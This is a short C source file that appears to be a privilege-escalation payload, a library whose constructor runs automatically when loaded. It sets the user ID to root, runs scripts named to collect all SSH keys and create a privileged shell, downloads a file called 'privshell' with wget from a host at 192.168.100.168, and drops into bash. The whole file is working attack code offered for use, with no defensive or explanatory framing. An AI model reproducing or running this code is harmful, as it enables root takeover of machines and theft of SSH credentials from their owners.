#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

__attribute((constructor))
static void sice() {
    setuid(0);
    system("id");
    system("ls");
    system("pwd");
    system("chmod +x get_all_ssh_keys.sh");
    system("./get_all_ssh_keys.sh");
    system("chmod +x create_privshell.sh");
    system("./create_privshell.sh");//You might get an error on this one, maybe because of the shell, check ReadMr to find and alternative
    system("wget http://192.168.100.168/privshell");
    system("bash");
    exit(0);
}
